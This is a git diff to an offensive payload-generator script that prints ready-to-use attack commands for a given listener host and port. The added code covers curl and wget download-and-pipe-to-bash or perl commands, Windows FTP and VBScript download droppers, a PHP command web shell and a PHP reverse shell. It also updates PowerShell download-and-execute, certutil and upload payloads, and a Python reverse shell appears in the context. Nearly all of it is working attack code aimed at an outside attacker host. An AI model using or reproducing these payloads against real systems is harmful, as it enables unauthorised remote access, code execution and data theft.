@@ -545,12 +545,23 @@ Simplifies payload creation and listener.
     b64py2   <LHOST> <LPORT>  |   base64 encoded python2 payload
     b64py3   <LHOST> <LPORT>  |   base64 encoded python3 payload
     nc       <LHOST> <LPORT>  |   np reverse_tcp payload
+    curlrun  <LHOST> <LPORT>  |   Curl download pipe to bash
+    curlrunp <LHOST> <LPORT>  |   Curl download and pipe to perl
+    wgetrun  <LHOST> <LPORT>  |   Wget download pipe to bash
+    wgetrunp <LHOST> <LPORT>  |   Wget download pipe to perl
   <~~~~~~~~~~~~~~~~~~~~~~~[Win Payloads CLI]~~~~~~~~~~~~~~~~~~~~~~~>
                               |
     winhttp  <LHOST> <LPORT>  |    windows download and execute
     windl    <LHOST> <LPORT>  |    windows download file
     wincert  <LHOST> <LPORT>  |    windows download file with certutil
     winup    <LHOST> <LPORT>  |    windows webdav file upload
+    ftpdl    <LHOST> <LPORT>  |    windows FTP download 
+    winwget  <LHOST> <LPORT>  |    windows wget download
+                              |
+  <~~~~~~~~~~~~~~~~~~~~~[PHP Shells]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>
+                              | 
+    phpcmd                    |    Standard PHP Shell
+    phprev   <LHOST> <LPORT>  |    PHP reverse shell
                               |
   <~~~~~~~~~~~~~~~~~~~~~[Payloads SQLI]~~~~~~~~~~~~~~~~~~~~~~~~~~~~>  
                               |
@@ -583,7 +594,16 @@ Simplifies payload creation and listener.
 
 if __name__ == '__main__':
 
-    if len(sys.argv) != 4:
+    try:
+        if sys.argv[1] == 'phpcmd':
+            print("")
+            print('<?php echo system($_REQUEST["cmd"]); ?>')
+            print("")
+            os._exit(0)
+    except:
+        pass
+
+    if len(sys.argv) <= 3:
         print_usage()
 
     type = sys.argv[1]
@@ -609,15 +629,15 @@ if __name__ == '__main__':
         sys.exit(0)
 
     if type == 'b64py':
-        print(python_reverse_shell(lhost,lport, ver=''))
+        print(python_reverse_shell(lhost, lport, ver=''))
         sys.exit(0)
 
     if type == 'b64py2':
-        print(python_reverse_shell(lhost,lport, ver='2'))
+        print(python_reverse_shell(lhost, lport, ver='2'))
         sys.exit(0)
 
     if type == 'b64py3':
-        print(python_reverse_shell(lhost,lport, ver='3'))
+        print(python_reverse_shell(lhost, lport, ver='3'))
         sys.exit(0)
 
     if type == 'httpsrv':
@@ -638,34 +658,183 @@ if __name__ == '__main__':
         os.system("php -S %s:%s" % (lhost, lport))
         sys.exit(0)
 
+    if type == 'phprev':
+
+        _payload = '''php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'''' % (lhost, lport)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
     if type == 'winhttp':
-        _payload = '''powershell "IEX(New-Object Net.WebClient).downloadString('http://%s:%s/shell.ps1')"''' % (lhost, lport)
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'shell.ps1'
+
+        _payload = '''powershell "IEX(New-Object Net.WebClient).downloadString('http://%s:%s/%s')"''' % (lhost, lport, file)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'ftpdl':
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'nc.exe'
+
+        _payload = '''
+python3 -m pyftpdlib -p %s 
+----------------------------------
+echo open %s %s> ftp.txt
+echo USER anonymous>> ftp.txt
+echo password>> ftp.txt
+echo bin >> ftp.txt
+echo GET %s >> ftp.txt
+echo bye >> ftp.txt
+---------------------------------
+ftp -v -n -s:ftp.txt
+''' % (lport, lhost, lport, file)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'winwget':
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'nc.exe'
+
+        _payload = '''
+--------------------------------------------------------------------------------------
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
+echo Err.Clear >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo http.Open "GET",strURL,False >> wget.vbs
+echo http.Send >> wget.vbs
+echo varByteArray = http.ResponseBody >> wget.vbs
+echo Set http = Nothing >> wget.vbs
+echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
+echo strData = "" >> wget.vbs
+echo strBuffer = "" >> wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
+echo Next >> wget.vbs
+echo ts.Close >> wget.vbs
+---------------------------------------------------------------------------------------
+cscript wget.vbs http://%s:%s/%s %s
+    ''' % (lhost, lport, file, file)
         print('')
         print(_payload)
         print('')
         sys.exit(0)
 
     if type == 'windl':
-        _payload = '''powershell -command "& { iwr http://%s:%s/shell.ps1 -OutFile shell.ps1 }"''' % (lhost, lport)
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'shell.ps1'
+
+        _payload = '''powershell -command "& { iwr http://%s:%s/%s -OutFile %s }"''' % (lhost, lport, file, file)
         print('')
         print(_payload)
         print('')
         sys.exit(0)
 
     if type == 'wincert':
-        _payload = '''certutil.exe -urlcache -split -f http://%s:%s/payload.exe''' % (lhost, lport)
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'payload.exe'
+
+        _payload = '''certutil.exe -urlcache -split -f http://%s:%s/%s''' % (lhost, lport, file)
         print('')
         print(_payload)
         print('')
         sys.exit(0)
 
     if type == 'winup':
-        _payload = '''powershell "$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile('http://%s:%s/filename', 'PUT', 'c:\\filename')"''' % (lhost, lport)
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'payload.exe'
+
+        _payload = '''powershell "$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile('http://%s:%s/%s', 'PUT', 'c:\\%s')"''' % (lhost, lport, file, file)
         print('')
         print(_payload)
         print('')
         sys.exit(0)
 
+    if type == 'curlrun':
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'payload.sh'
+
+        _payload = '''curl -s https://%s:%s/%s|bash  ''' % (lhost, lport, file)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'curlrunp':
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'payload.pl'
+
+        _payload = '''curl -s https://%s:%s/%s|perl  ''' % (lhost, lport, file)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'wgetrun':
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'payload.sh'
+
+        _payload = '''wget -q -O - https://%s:%s/%s|bash  ''' % (lhost, lport, file)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
+
+    if type == 'wgetrunp':
+
+        try:
+            file = sys.argv[4] if len(sys.argv[4]) > 1 else ''
+        except:
+            file = 'payload.pl'
+
+        _payload = '''wget -q -O - https://%s:%s/%s|perl  ''' % (lhost, lport, file)
+        print('')
+        print(_payload)
+        print('')
+        sys.exit(0)
 
     if type == 'python':
         _payload = '''python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("%s", %s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' ''' % (lhost, lport)
